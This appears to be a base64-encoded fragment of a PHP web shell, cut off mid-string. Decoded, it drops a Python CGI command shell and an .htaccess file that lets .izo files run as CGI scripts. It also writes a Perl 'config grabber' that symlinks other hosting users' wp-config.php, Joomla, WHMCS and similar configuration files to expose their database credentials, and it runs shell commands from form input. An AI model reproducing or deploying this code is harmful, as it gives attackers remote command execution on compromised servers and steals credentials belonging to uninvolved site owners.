diM0owSUZOMGNtbHVaMGxQQ21aeQpiMjBnZEhKaFkyVmlZV05ySUdsdGNHOXlkQ0J3Y21sdWRGOWxlR01LQ2lNakl5TWpJeU1qSXlNakl5TWpJeU1qSXlNakl5TWpJeU1qCkl5TWpJeU1qSXlNakl5TWpJeU1qSXlNakl5TWpJeU1qSXlNakl5TWpJeU1qSXlNakl5TUtJeUJqYjI1emRHRnVkSE1LQ21admJuUnMKYVc1bElEMGdKenhHVDA1VUlFTlBURTlTUFNNME1qUXlORElnYzNSNWJHVTlJbVp2Ym5RdFptRnRhV3g1T25ScGJXVnpPMlp2Ym5RdApjMmw2WlRveE1uQjBPeUkrSndwMlpYSnphVzl1YzNSeWFXNW5JRDBnSjFabGNuTnBiMjRnTVM0d0xqQWdOM1JvSUVwMWJIa2dNakF3Ck5DY0tDbWxtSUc5ekxtVnVkbWx5YjI0dWFHRnpYMnRsZVNnaVUwTlNTVkJVWDA1QlRVVWlLVG9LSUNBZ0lITmpjbWx3ZEc1aGJXVWcKUFNCdmN5NWxiblpwY205dVd5SlRRMUpKVUZSZlRrRk5SU0pkQ21Wc2MyVTZDaUFnSUNCelkzSnBjSFJ1WVcxbElEMGdJaUlLQ2sxRgpWRWhQUkNBOUlDY2lVRTlUVkNJbkNnb2pJeU1qSXlNakl5TWpJeU1qSXlNakl5TWpJeU1qSXlNakl5TWpJeU1qSXlNakl5TWpJeU1qCkl5TWpJeU1qSXlNakl5TWpJeU1qSXlNakl5TWpJeU1qQ2lNZ1VISnBkbUYwWlNCbWRXNWpkR2x2Ym5NZ1lXNWtJSFpoY21saFlteGwKY3dvS1pHVm1JR2RsZEdadmNtMG9kbUZzZFdWc2FYTjBMQ0IwYUdWbWIzSnRMQ0J1YjNSd2NtVnpaVzUwUFNjbktUb0tJQ0FnSUNJaQpJbFJvYVhNZ1puVnVZM1JwYjI0c0lHZHBkbVZ1SUdFZ1EwZEpJR1p2Y20wc0lHVjRkSEpoWTNSeklIUm9aU0JrWVhSaElHWnliMjBnCmFYUXNJR0poYzJWa0lHOXVDaUFnSUNCMllXeDFaV3hwYzNRZ2NHRnpjMlZrSUdsdUxpQkJibmtnYm05dUxYQnlaWE5sYm5RZ2RtRnMKZFdWeklHRnlaU0J6WlhRZ2RHOGdKeWNnTFNCaGJIUm9iM1ZuYUNCMGFHbHpJR05oYmlCaVpTQmphR0Z1WjJWa0xnb2dJQ0FnS0dVdQpaeTRnZEc4Z2NtVjBkWEp1SUU1dmJtVWdjMjhnZVc5MUlHTmhiaUIwWlhOMElHWnZjaUJ0YVhOemFXNW5JR3RsZVhkdmNtUnpJQzBnCmQyaGxjbVVnSnljZ2FYTWdZU0IyWVd4cFpDQmhibk4zWlhJZ1luVjBJSFJ2SUdoaGRtVWdkR2hsSUdacFpXeGtJRzFwYzNOcGJtY2cKYVhOdUozUXVLU0lpSWdvZ0lDQWdaR0YwWVNBOUlIdDlDaUFnSUNCbWIzSWdabWxsYkdRZ2FXNGdkbUZzZFdWc2FYTjBPZ29nSUNBZwpJQ0FnSUdsbUlHNXZkQ0IwYUdWbWIzSnRMbWhoYzE5clpYa29abWxsYkdRcE9nb2dJQ0FnSUNBZ0lDQWdJQ0JrWVhSaFcyWnBaV3hrClhTQTlJRzV2ZEhCeVpYTmxiblFLSUNBZ0lDQWdJQ0JsYkhObE9nb2dJQ0FnSUNBZ0lDQWdJQ0JwWmlBZ2RIbHdaU2gwYUdWbWIzSnQKVzJacFpXeGtYU2tnSVQwZ2RIbHdaU2hiWFNrNkNpQWdJQ0FnSUNBZ0lDQWdJQ0FnSUNCa1lYUmhXMlpwWld4a1hTQTlJSFJvWldadgpjbTFiWm1sbGJHUmRMblpoYkhWbENpQWdJQ0FnSUNBZ0lDQWdJR1ZzYzJVNkNpQWdJQ0FnSUNBZ0lDQWdJQ0FnSUNCMllXeDFaWE1nClBTQnRZWEFvYkdGdFltUmhJSGc2SUhndWRtRnNkV1VzSUhSb1pXWnZjbTFiWm1sbGJHUmRLU0FnSUNBZ0l5QmhiR3h2ZDNNZ1ptOXkKSUd4cGMzUWdkSGx3WlNCMllXeDFaWE1LSUNBZ0lDQWdJQ0FnSUNBZ0lDQWdJR1JoZEdGYlptbGxiR1JkSUQwZ2RtRnNkV1Z6Q2lBZwpJQ0J5WlhSMWNtNGdaR0YwWVFvS0NuUm9aV1p2Y20xb1pXRmtJRDBnSWlJaVBFaFVUVXcrUEVoRlFVUStQRlJKVkV4RlBtTm5hUzF6CmFHVnNiQzV3ZVNBdElHRWdRMGRKSUdKNUlFWjFlbnA1YldGdVBDOVVTVlJNUlQ0OEwwaEZRVVErQ2p4Q1QwUlpQanhEUlU1VVJWSSsKQ2p4SU1UNVhaV3hqYjIxbElIUnZJR05uYVMxemFHVnNiQzV3ZVNBdElEeENVajVoSUZCNWRHaHZiaUJEUjBrOEwwZ3hQZ284UWo0OApTVDVDZVNCR2RYcDZlVzFoYmp3dlFqNDhMMGsrUEVKU1Bnb2lJaUlyWm05dWRHeHBibVVnS3lKV1pYSnphVzl1SURvZ0lpQXJJSFpsCmNuTnBiMjV6ZEhKcGJtY2dLeUFpSWlJc0lGSjFibTVwYm1jZ2IyNGdPaUFpSWlJZ0t5QnpkSEptZEdsdFpTZ25KVWs2SlUwZ0pYQXMKSUNWQklDVmtJQ1ZDTENBbFdTY3BLeWN1UEM5RFJVNVVSVkkrUEVKU1BpY0tDblJvWldadmNtMGdQU0FpSWlJOFNESStSVzUwWlhJZwpRMjl0YldGdVpEd3ZTREkrQ2p4R1QxSk5JRTFGVkVoUFJEMWNJaUlpSWlBcklFMUZWRWhQUkNBcklDY2lJR0ZqZEdsdmJqMGlKeUFyCklITmpjbWx3ZEc1aGJXVWdLeUFpSWlKY0lqNEtQR2x1Y0hWMElHNWhiV1U5WTIxa0lIUjVjR1U5ZEdWNGRENDhRbEkrQ2p4cGJuQjEKZENCMGVYQmxQWE4xWW0xcGRDQjJZV3gxWlQwaVUzVmliV2wwSWo0OFFsSStDand2Ums5U1RUNDhRbEkrUEVKU1BpSWlJZ3BpYjJSNQpaVzVrSUQwZ0p6d3ZRazlFV1Q0OEwwaFVUVXcrSndwbGNuSnZjbTFsYzNNZ1BTQW5QRU5GVGxSRlVqNDhTREkrVTI5dFpYUm9hVzVuCklGZGxiblFnVjNKdmJtYzhMMGd5UGp4Q1VqNDhVRkpGUGljS0NpTWpJeU1qSXlNakl5TWpJeU1qSXlNakl5TWpJeU1qSXlNakl5TWoKSXlNakl5TWpJeU1qSXlNakl5TWpJeU1qSXlNakl5TWpJeU1qSXlNakl5TWpJeU1LSXlCdFlXbHVJR0p2WkhrZ2IyWWdkR2hsSUhOagpjbWx3ZEFvS2FXWWdYMTl1WVcxbFgxOGdQVDBnSjE5ZmJXRnBibDlmSnpvS0lDQWdJSEJ5YVc1MElDSkRiMjUwWlc1MExYUjVjR1U2CklIUmxlSFF2YUhSdGJDSWdJQ0FnSUNBZ0lDQWpJSFJvYVhNZ2FYTWdkR2hsSUdobFlXUmxjaUIwYnlCMGFHVWdjMlZ5ZG1WeUNpQWcKSUNCd2NtbHVkQ0FnSUNBZ0lDQWdJQ0FnSUNBZ0lDQWdJQ0FnSUNBZ0lDQWdJQ0FnSUNBZ0lDQWdJeUJ6YnlCcGN5QjBhR2x6SUdKcwpZVzVySUd4cGJtVUtJQ0FnSUdadmNtMGdQU0JqWjJrdVJtbGxiR1JUZEc5eVlXZGxLQ2tLSUNBZ0lHUmhkR0VnUFNCblpYUm1iM0p0CktGc25ZMjFrSjEwc1ptOXliU2tLSUNBZ0lIUm9aV050WkNBOUlHUmhkR0ZiSjJOdFpDZGRDaUFnSUNCd2NtbHVkQ0IwYUdWbWIzSnQKYUdWaFpBb2dJQ0FnY0hKcGJuUWdkR2hsWm05eWJRb2dJQ0FnYVdZZ2RHaGxZMjFrT2dvZ0lDQWdJQ0FnSUhCeWFXNTBJQ2M4U0ZJKwpQRUpTUGp4Q1VqNG5DaUFnSUNBZ0lDQWdjSEpwYm5RZ0p6eENQa052YlcxaGJtUWdPaUFuTENCMGFHVmpiV1FzSUNjOFFsSStQRUpTClBpY0tJQ0FnSUNBZ0lDQndjbWx1ZENBblVtVnpkV3gwSURvZ1BFSlNQanhDVWo0bkNpQWdJQ0FnSUNBZ2RISjVPZ29nSUNBZ0lDQWcKSUNBZ0lDQmphR2xzWkY5emRHUnBiaXdnWTJocGJHUmZjM1JrYjNWMElEMGdiM011Y0c5d1pXNHlLSFJvWldOdFpDa0tJQ0FnSUNBZwpJQ0FnSUNBZ1kyaHBiR1JmYzNSa2FXNHVZMnh2YzJVb0tRb2dJQ0FnSUNBZ0lDQWdJQ0J5WlhOMWJIUWdQU0JqYUdsc1pGOXpkR1J2CmRYUXVjbVZoWkNncENpQWdJQ0FnSUNBZ0lDQWdJR05vYVd4a1gzTjBaRzkxZEM1amJHOXpaU2dwQ2lBZ0lDQWdJQ0FnSUNBZ0lIQnkKYVc1MElISmxjM1ZzZEM1eVpYQnNZV05sS0NkY2JpY3NJQ2M4UWxJK0p5a0tDaUFnSUNBZ0lDQWdaWGhqWlhCMElFVjRZMlZ3ZEdsdgpiaXdnWlRvZ0lDQWdJQ0FnSUNBZ0lDQWdJQ0FnSUNBZ0lDQWdJeUJoYmlCbGNuSnZjaUJwYmlCbGVHVmpkWFJwYm1jZ2RHaGxJR052CmJXMWhibVFLSUNBZ0lDQWdJQ0FnSUNBZ2NISnBiblFnWlhKeWIzSnRaWE56Q2lBZ0lDQWdJQ0FnSUNBZ0lHWWdQU0JUZEhKcGJtZEoKVHlncENpQWdJQ0FnSUNBZ0lDQWdJSEJ5YVc1MFgyVjRZeWhtYVd4bFBXWXBDaUFnSUNBZ0lDQWdJQ0FnSUdFZ1BTQm1MbWRsZEhaaApiSFZsS0NrdWMzQnNhWFJzYVc1bGN5Z3BDaUFnSUNBZ0lDQWdJQ0FnSUdadmNpQnNhVzVsSUdsdUlHRTZDaUFnSUNBZ0lDQWdJQ0FnCklDQWdJQ0J3Y21sdWRDQnNhVzVsQ2dvZ0lDQWdjSEpwYm5RZ1ltOWtlV1Z1WkFvS0NpSWlJZ3BVVDBSUEwwbFRVMVZGVXdvS0NncEQKU0VGT1IwVk1UMGNLQ2pBM0xUQTNMVEEwSUNBZ0lDQWdJQ0JXWlhKemFXOXVJREV1TUM0d0NrRWdkbVZ5ZVNCaVlYTnBZeUJ6ZVhOMApaVzBnWm05eUlHVjRaV04xZEdsdVp5QnphR1ZzYkNCamIyMXRZVzVrY3k0S1NTQnRZWGtnWlhod1lXNWtJR2wwSUdsdWRHOGdZU0J3CmNtOXdaWElnSjJWdWRtbHliMjV0Wlc1MEp5QjNhWFJvSUhObGMzTnBiMjRnY0dWeWMybHpkR1Z1WTJVdUxpNEtJaUlpJzsKCiRmaWxlID0gZm9wZW4oInB5dGhvbi5pem8iICwidysiKTsKJHdyaXRlID0gZndyaXRlICgkZmlsZSAsYmFzZTY0X2RlY29kZSgkcHl0aG9ucCkpOwpmY2xvc2UoJGZpbGUpOwogICAgY2htb2QoInB5dGhvbi5pem8iLDA3NTUpOwogICBlY2hvICI8aWZyYW1lIHNyYz1weXRob24vcHl0aG9uLml6byB3aWR0aD0xMDAlIGhlaWdodD0xMDAlIGZyYW1lYm9yZGVyPTA+PC9pZnJhbWU+ICI7Cn0KaWYgKGlzc2V0KCRfUE9TVFsnU3VibWl0MTEnXSkpCnsKICAgIG1rZGlyKCdhbGxjb25maWcnLCAwNzU1KTsKICAgIGNoZGlyKCdhbGxjb25maWcnKTsKICAgICAgICAka29rZG9zeWEgPSAiLmh0YWNjZXNzIjsKICAgICAgICAkZG9zeWFfYWRpID0gIiRrb2tkb3N5YSI7CiAgICAgICAgJGRvc3lhID0gZm9wZW4gKCRkb3N5YV9hZGkgLCAndycpIG9yIGRpZSAoIkRvc3lhIGHDp8SxbGFtYWTEsSEiKTsKICAgICAgICAkbWV0aW4gPSAiQWRkSGFuZGxlciBjZ2ktc2NyaXB0IC5pem8iOyAgICAKICAgICAgICBmd3JpdGUgKCAkZG9zeWEgLCAkbWV0aW4gKSA7CiAgICAgICAgZmNsb3NlICgkZG9zeWEpOwokY29uZmlnc2hlbGwgPSAnSXlFdmRYTnlMMkpwYmk5d1pYSnNJQzFKTDNWemNpOXNiMk5oYkM5aVlXNWtiV2x1Q25CeWFXNTBJQ0pEYjI1MFpXNTBMWFI1Y0dVNklIUmxlSFF2YUhSdGJGeHVYRzRpT3dwd2NtbHVkQ2M4SVVSUFExUlpVRVVnYUhSdGJDQlFWVUpNU1VNZ0lpMHZMMWN6UXk4dlJGUkVJRmhJVkUxTUlERXVNQ0JVY21GdWMybDBhVzl1WVd3dkwwVk9JaUFpYUhSMGNEb3ZMM2QzZHk1M015NXZjbWN2VkZJdmVHaDBiV3d4TDBSVVJDOTRhSFJ0YkRFdGRISmhibk5wZEdsdmJtRnNMbVIwWkNJK0NqeG9kRzFzSUhodGJHNXpQU0pvZEhSd09pOHZkM2QzTG5jekxtOXlaeTh4T1RrNUwzaG9kRzFzSWo0S1BHaGxZV1ErQ2p4dFpYUmhJR2gwZEhBdFpYRjFhWFk5SWtOdmJuUmxiblF0VEdGdVozVmhaMlVpSUdOdmJuUmxiblE5SW1WdUxYVnpJaUF2UGdvOGJXVjBZU0JvZEhSd0xXVnhkV2wyUFNKRGIyNTBaVzUwTFZSNWNHVWlJR052Ym5SbGJuUTlJblJsZUhRdmFIUnRiRHNnWTJoaGNuTmxkRDExZEdZdE9DSWdMejRLUEhScGRHeGxQbHQrWFNCRGVXSXpjaTFFV2lCRGIyNW1hV2NnTFNCYmZsMGdQQzkwYVhSc1pUNEtQSE4wZVd4bElIUjVjR1U5SW5SbGVIUXZZM056SWo0S0xtNWxkMU4wZVd4bE1TQjdDaUJtYjI1MExXWmhiV2xzZVRvZ1ZHRm9iMjFoT3dvZ1ptOXVkQzF6YVhwbE9pQjRMWE50WVd4c093b2dabTl1ZEMxM1pXbG5hSFE2SUdKdmJHUTdDaUJqYjJ4dmNqb2dJekF3UmtaR1Jqc0tJQ0IwWlhoMExXRnNhV2R1T2lCalpXNTBaWEk3Q24wS1BDOXpkSGxzWlQ0S1BDOW9aV0ZrUGdvbk93cHpkV0lnYkdsc2V3b2dJQ0FnS0NSMWMyVnlLU0E5SUVCZk93b2tiWE55SUQwZ2NYaDdjSGRrZlRzS0pHdHZiR0U5SkcxemNpNGlMeUl1SkhWelpYSTdDaVJyYjJ4aFBYNXpMMXh1THk5bk95QUtjM2x0YkdsdWF5Z25MMmh2YldVdkp5NGtkWE5sY2k0bkwzQjFZbXhwWTE5b2RHMXNMMmx1WTJ4MVpHVnpMMk52Ym1acFozVnlaUzV3YUhBbkxDUnJiMnhoTGljdGMyaHZjQzUwZUhRbktUc0tjM2x0YkdsdWF5Z25MMmh2YldVdkp5NGtkWE5sY2k0bkwzQjFZbXhwWTE5b2RHMXNMMkZ0WlcxaVpYSXZZMjl1Wm1sbkxtbHVZeTV3YUhBbkxDUnJiMnhoTGljdFlXMWxiV0psY2k1MGVIUW5LVHNLYzNsdGJHbHVheWduTDJodmJXVXZKeTRrZFhObGNpNG5MM0IxWW14cFkxOW9kRzFzTDJOdmJtWnBaeTVwYm1NdWNHaHdKeXdrYTI5c1lTNG5MV0Z0WlcxaVpYSXlMblI0ZENjcE93cHplVzFzYVc1cktDY3ZhRzl0WlM4bkxpUjFjMlZ5TGljdmNIVmliR2xqWDJoMGJXd3ZiV1Z0WW1WeWN5OWpiMjVtYVdkMWNtRjBhVzl1TG5Cb2NDY3NKR3R2YkdFdUp5MXRaVzFpWlhKekxuUjRkQ2NwT3dwemVXMXNhVzVyS0NjdmFHOXRaUzhuTGlSMWMyVnlMaWN2Y0hWaWJHbGpYMmgwYld3dlkyOXVabWxuTG5Cb2NDY3NKR3R2YkdFdUp6SXVkSGgwSnlrN0NuTjViV3hwYm1zb0p5OW9iMjFsTHljdUpIVnpaWEl1Snk5d2RXSnNhV05mYUhSdGJDOW1iM0oxYlM5cGJtTnNkV1JsY3k5amIyNW1hV2N1Y0dod0p5d2thMjlzWVM0bkxXWnZjblZ0TG5SNGRDY3BPd3B6ZVcxc2FXNXJLQ2N2YUc5dFpTOG5MaVIxYzJWeUxpY3ZjSFZpYkdsalgyaDBiV3d2WVdSdGFXNHZZMjl1Wmk1d2FIQW5MQ1JyYjJ4aExpYzFMblI0ZENjcE93cHplVzFzYVc1cktDY3ZhRzl0WlM4bkxpUjFjMlZ5TGljdmNIVmliR2xqWDJoMGJXd3ZZV1J0YVc0dlkyOXVabWxuTG5Cb2NDY3NKR3R2YkdFdUp6UXVkSGgwSnlrN0NuTjViV3hwYm1zb0p5OW9iMjFsTHljdUpIVnpaWEl1Snk5d2RXSnNhV05mYUhSdGJDOTNjQzFqYjI1bWFXY3VjR2h3Snl3a2EyOXNZUzRuTFhkd01UTXVkSGgwSnlrN0NuTjViV3hwYm1zb0p5OW9iMjFsTHljdUpIVnpaWEl1Snk5d2RXSnNhV05mYUhSdGJDOWliRzluTDNkd0xXTnZibVpwWnk1d2FIQW5MQ1JyYjJ4aExpY3RkM0F0WW14dlp5NTBlSFFuS1RzS2MzbHRiR2x1YXlnbkwyaHZiV1V2Snk0a2RYTmxjaTRuTDNCMVlteHBZMTlvZEcxc0wyTnZibVpmWjJ4dlltRnNMbkJvY0Njc0pHdHZiR0V1SnpZdWRIaDBKeWs3Q25ONWJXeHBibXNvSnk5b2IyMWxMeWN1SkhWelpYSXVKeTl3ZFdKc2FXTmZhSFJ0YkM5cGJtTnNkV1JsTDJSaUxuQm9jQ2NzSkd0dmJHRXVKemN1ZEhoMEp5azdDbk41Yld4cGJtc29KeTlvYjIxbEx5Y3VKSFZ6WlhJdUp5OXdkV0pzYVdOZmFIUnRiQzlqYjI1dVpXTjBMbkJvY0Njc0pHdHZiR0V1SnpndWRIaDBKeWs3Q25ONWJXeHBibXNvSnk5b2IyMWxMeWN1SkhWelpYSXVKeTl3ZFdKc2FXTmZhSFJ0YkM5dGExOWpiMjVtTG5Cb2NDY3NKR3R2YkdFdUp6a3VkSGgwSnlrN0NuTjViV3hwYm1zb0p5OW9iMjFsTHljdUpIVnpaWEl1Snk5d2RXSnNhV05mYUhSdGJDOXBibU5zZFdSbEwyTnZibVpwWnk1d2FIQW5MQ1JyYjJ4aExpY3hNaTUwZUhRbktUc0tjM2x0YkdsdWF5Z25MMmh2YldVdkp5NGtkWE5sY2k0bkwzQjFZbXhwWTE5b2RHMXNMMnB2YjIxc1lTOWpiMjVtYVdkMWNtRjBhVzl1TG5Cb2NDY3NKR3R2YkdFdUp5MXFiMjl0YkdFdWRIaDBKeWs3Q25ONWJXeHBibXNvSnk5b2IyMWxMeWN1SkhWelpYSXVKeTl3ZFdKc2FXTmZhSFJ0YkM5MllpOXBibU5zZFdSbGN5OWpiMjVtYVdjdWNHaHdKeXdrYTI5c1lTNG5MWFppTG5SNGRDY3BPd3B6ZVcxc2FXNXJLQ2N2YUc5dFpTOG5MaVIxYzJWeUxpY3ZjSFZpYkdsalgyaDBiV3d2YVc1amJIVmtaWE12WTI5dVptbG5MbkJvY0Njc0pHdHZiR0V1SnkxcGJtTnNkV1JsY3kxMllpNTBlSFFuS1RzS2MzbHRiR2x1YXlnbkwyaHZiV1V2Snk0a2RYTmxjaTRuTDNCMVlteHBZMTlvZEcxc0wzZG9iUzlqYjI1bWFXZDFjbUYwYVc5dUxuQm9jQ2NzSkd0dmJHRXVKeTEzYUcweE5TNTBlSFFuS1RzS2MzbHRiR2x1YXlnbkwyaHZiV1V2Snk0a2RYTmxjaTRuTDNCMVlteHBZMTlvZEcxc0wzZG9iV012WTI5dVptbG5kWEpoZEdsdmJpNXdhSEFuTENScmIyeGhMaWN0ZDJodFl6RTJMblI0ZENjcE93cHplVzFzYVc1cktDY3ZhRzl0WlM4bkxpUjFjMlZ5TGljdmNIVmliR2xqWDJoMGJXd3ZkMmh0WTNNdlkyOXVabWxuZFhKaGRHbHZiaTV3YUhBbkxDUnJiMnhoTGljdGQyaHRZM011ZEhoMEp5azdDbk41Yld4cGJtc29KeTlvYjIxbEx5Y3VKSFZ6WlhJdUp5OXdkV0pzYVdOZmFIUnRiQzl6ZFhCd2IzSjBMMk52Ym1acFozVnlZWFJwYjI0dWNHaHdKeXdrYTI5c1lTNG5MWE4xY0hCdmNuUXVkSGgwSnlrN0NuTjViV3hwYm1zb0p5OW9iMjFsTHljdUpIVnpaWEl1Snk5d2RXSnNhV05mYUhSdGJDOWpiMjVtYVdkMWNtRjBhVzl1TG5Cb2NDY3NKR3R2YkdFdUp6RjNhRzFqY3k1MGVIUW5LVHNLYzNsdGJHbHVheWduTDJodmJXVXZKeTRrZFhObGNpNG5MM0IxWW14cFkxOW9kRzFzTDNOMVltMXBkSFJwWTJ0bGRDNXdhSEFuTENScmIyeGhMaWN0ZDJodFkzTXlMblI0ZENjcE93cHplVzFzYVc1cktDY3ZhRzl0WlM4bkxpUjFjMlZ5TGljdmNIVmliR2xqWDJoMGJXd3ZZMnhwWlc1MGN5OWpiMjVtYVdkMWNtRjBhVzl1TG5Cb2NDY3NKR3R2YkdFdUp5MWpiR2xsYm5SekxuUjRkQ2NwT3dwemVXMXNhVzVyS0NjdmFHOXRaUzhuTGlSMWMyVnlMaWN2Y0hWaWJHbGpYMmgwYld3dlkyeHBaVzUwTDJOdmJtWnBaM1Z5WVhScGIyNHVjR2h3Snl3a2EyOXNZUzRuTFdOc2FXVnVkQzUwZUhRbktUc0tjM2x0YkdsdWF5Z25MMmh2YldVdkp5NGtkWE5sY2k0bkwzQjFZbXhwWTE5b2RHMXNMMk5zYVdWdWRHVnpMMk52Ym1acFozVnlZWFJwYjI0dWNHaHdKeXdrYTI5c1lTNG5MV05zYVdWdWRITXVkSGgwSnlrN0NuTjViV3hwYm1zb0p5OW9iMjFsTHljdUpIVnpaWEl1Snk5d2RXSnNhV05mYUhSdGJDOWlhV3hzYVc1bkwyTnZibVpwWjNWeVlYUnBiMjR1Y0dod0p5d2thMjlzWVM0bkxXSnBiR3hwYm1jdWRIaDBKeWs3SUFwemVXMXNhVzVyS0NjdmFHOXRaUzhuTGlSMWMyVnlMaWN2Y0hWaWJHbGpYMmgwYld3dmJXRnVZV2RsTDJOdmJtWnBaM1Z5WVhScGIyNHVjR2h3Snl3a2EyOXNZUzRuTFdKcGJHeHBibWN1ZEhoMEp5azdJQXB6ZVcxc2FXNXJLQ2N2YUc5dFpTOG5MaVIxYzJWeUxpY3ZjSFZpYkdsalgyaDBiV3d2YlhrdlkyOXVabWxuZFhKaGRHbHZiaTV3YUhBbkxDUnJiMnhoTGljdFltbHNiR2x1Wnk1MGVIUW5LVHNnQ25ONWJXeHBibXNvSnk5b2IyMWxMeWN1SkhWelpYSXVKeTl3ZFdKc2FXTmZhSFJ0YkM5dGVYTm9iM0F2WTI5dVptbG5kWEpoZEdsdmJpNXdhSEFuTENScmIyeGhMaWN0WW1sc2JHbHVaeTUwZUhRbktUc2dDbjBLYVdZZ0tDUkZUbFo3SjFKRlVWVkZVMVJmVFVWVVNFOUVKMzBnWlhFZ0oxQlBVMVFuS1NCN0NpQWdjbVZoWkNoVFZFUkpUaXdnSkdKMVptWmxjaXdnSkVWT1Zuc25RMDlPVkVWT1ZGOU1SVTVIVkVnbmZTazdDbjBnWld4elpTQjdDaUFnSkdKMVptWmxjaUE5SUNSRlRsWjdKMUZWUlZKWlgxTlVVa2xPUnlkOU93cDlDa0J3WVdseWN5QTlJSE53YkdsMEtDOG1MeXdnSkdKMVptWmxjaWs3Q21admNtVmhZMmdnSkhCaGFYSWdLRUJ3WVdseWN5a2dld29nSUNna2JtRnRaU3dnSkhaaGJIVmxLU0E5SUhOd2JHbDBLQzg5THl3Z0pIQmhhWElwT3dvZ0lDUnVZVzFsSUQxK0lIUnlMeXN2SUM4N0NpQWdKRzVoYldVZ1BYNGdjeThsS0Z0aExXWkJMVVl3TFRsZFcyRXRaa0V0UmpBdE9WMHBMM0JoWTJzb0lrTWlMQ0JvWlhnb0pERXBLUzlsWnpzS0lDQWtkbUZzZFdVZ1BYNGdkSEl2S3k4Z0x6c0tJQ0FrZG1Gc2RXVWdQWDRnY3k4bEtGdGhMV1pCTFVZd0xUbGRXMkV0WmtFdFJqQXRPVjBwTDNCaFkyc29Ja01pTENCb1pYZ29KREVwS1M5bFp6c0tJQ0FrUms5U1RYc2tibUZ0WlgwZ1BTQWtkbUZzZFdVN0NuMEthV1lnS0NSR1QxSk5lM0JoYzNOOUlHVnhJQ0lpS1hzS2NISnBiblFnSndvOFltOWtlU0JqYkdGemN6MGlibVYzVTNSNWJHVXhJaUJpWjJOdmJHOXlQU0lqTURBd01EQXdJajRLUEhOd1lXNGdjM1I1YkdVOUluUmxlSFF0WkdWamIzSmhkR2x2YmpvZ2JtOXVaU0krUEdadmJuUWdZMjlzYjNJOUlpTXdNRVpHTURBaVBuTjViV3hxYm1zZ1lXeHNJR052Ym1acFp6d3ZabTl1ZEQ0OEwzTndZVzQrUEM5aFBpQUtQR1p2Y20wZ2JXVjBhRzlrUFNKd2IzTjBJajRLUEhSbGVIUmhjbVZoSUc1aGJXVTlJbkJoYzNNaUlITjBlV3hsUFNKaWIzSmtaWEk2TVhCNElHUnZkSFJsWkNBak1EQkdSa1pHT3lCM2FXUjBhRG9nTlRRemNIZzdJR2hsYVdkb2REb2dOREl3Y0hnN0lHSmhZMnRuY205MWJtUXRZMjlzYjNJNkl6QkRNRU13UXpzZ1ptOXVkQzFtWVcxcGJIazZWR0ZvYjIxaE95Qm1iMjUwTFhOcGVtVTZPSEIwT3lCamIyeHZjam9qTURCR1JrWkdJaUFnUGp3dmRHVjRkR0Z5WldFK1BHSnlJQzgrQ2ladVluTndPenh3UGdvOGFXNXdkWFFnYm1GdFpUMGlkR0Z5SWlCMGVYQmxQU0owWlhoMElpQnpkSGxzWlQwaVltOXlaR1Z5T2pGd2VDQmtiM1IwWldRZ0l6QXdSa1pHUmpzZ2QybGtkR2c2SURJeE1uQjRPeUJpWVdOclozSnZkVzVrTFdOdmJHOXlPaU13UXpCRE1FTTdJR1p2Ym5RdFptRnRhV3g1T2xSaGFHOXRZVHNnWm05dWRDMXphWHBsT2pod2REc2dZMjlzYjNJNkl6QXdSa1pHUmpzZ0lpQWdMejQ4WW5JZ0x6NEtKbTVpYzNBN1BDOXdQZ284Y0Q0S1BHbHVjSFYwSUc1aGJXVTlJbE4xWW0xcGRERWlJSFI1Y0dVOUluTjFZbTFwZENJZ2RtRnNkV1U5SWtkbGRDQkRiMjVtYVdjaUlITjBlV3hsUFNKaWIzSmtaWEk2TVhCNElHUnZkSFJsWkNBak1EQkdSa1pHT3lCM2FXUjBhRG9nT1RrN0lHWnZiblF0Wm1GdGFXeDVPbFJoYUc5dFlUc2dabTl1ZEMxemFYcGxPakV3Y0hRN0lHTnZiRzl5T2lNd01FWkdSa1k3SUhSbGVIUXRkSEpoYm5ObWIzSnRPblZ3Y0dWeVkyRnpaVHNnYUdWcFoyaDBPakl6T3lCaVlXTnJaM0p2ZFc1a0xXTnZiRzl5T2lNd1F6QkRNRU1pSUM4K1BDOXdQZ284TDJadmNtMCtKenNLZldWc2MyVjdDa0JzYVc1bGN5QTlQQ1JHVDFKTmUzQmhjM045UGpzS0pIa2dQU0JBYkdsdVpYTTdDbTl3Wlc0Z0tFMVpSa2xNUlN3Z0lqNTBZWEl1ZEcxd0lpazdDbkJ5YVc1MElFMVpSa2xNUlNBaWRHRnlJQzFqZW1ZZ0lpNGtSazlTVFh0MFlYSjlMaUl1ZEdGeUlDSTdDbVp2Y2lBb0pHdGhQVEE3Skd0aFBDUjVPeVJyWVNzcktYc0tkMmhwYkdVb1FHeHBibVZ6V3lScllWMGdJRDErSUcwdktDNHFQeWs2ZURvdlp5bDdDaVpzYVd3b0pERXBPd3B3Y21sdWRDQk5XVVpKVEVVZ0pERXVJaTUwZUhRZ0lqc0tabTl5S0NSclpEMHhPeVJyWkR3eE9Ec2thMlFyS3lsN0NuQnlhVzUwSUUxWlJrbE1SU0FrTVM0a2EyUXVJaTUwZUhRZ0lqc0tmUXA5Q2lCOUNuQnlhVzUwSnp4aWIyUjVJR05zWVhOelBTSnVaWGRUZEhsc1pURWlJR0puWTI5c2IzSTlJaU13TURBd01EQWlQZ284Y0Q1RWIyNWxJQ0VoUEM5d1BnbzhjRDRtYm1KemNEczhMM0ErSnpzS2FXWW9KRVpQVWsxN2RHRnlmU0J1WlNBaUlpbDdDbTl3Wlc0b1NVNUdUeXdnSW5SaGNpNTBiWEFpS1RzS1FHeHBibVZ6SUQwOFNVNUdUejRnT3dwamJHOXpaU2hKVGtaUEtUc0tjM2x6ZEdWdEtFQnNhVzVsY3lrN0NuQnlhVzUwSnp4d1BqeGhJR2h5WldZOUlpY3VKRVpQVWsxN2RHRnlmUzRuTG5SaGNpSStQR1p2Ym5RZ1kyOXNiM0k5SWlNd01FWkdNREFpUGdvOGMzQmhiaUJ6ZEhsc1pUMGlkR1Y0ZEMxa1pXTnZjbUYwYVc5dU9pQnViMjVsSWo1RGJHbGpheUJJWlhKbElGUnZJRVJ2ZDI1c2IyRmtJRlJoY2lCR2FXeGxQQzl6Y0dGdVBqd3ZabTl1ZEQ0OEwyRStQQzl3UGljN0NuMEtmUW9nY0hKcGJuUWlDand2WW05a2VUNEtQQzlvZEcxc1BpSTcKJzsKCiRmaWxlID0gZm9wZW4oImNvbmZpZy5pem8iICwidysiKTsKJHdyaXRlID0gZndyaXRlICgkZmlsZSAsYmFzZTY0X2RlY29kZSgkY29uZmlnc2hlbGwpKTsKZmNsb3NlKCRmaWxlKTsKICAgIGNobW9kKCJjb25maWcuaXpvIiwwNz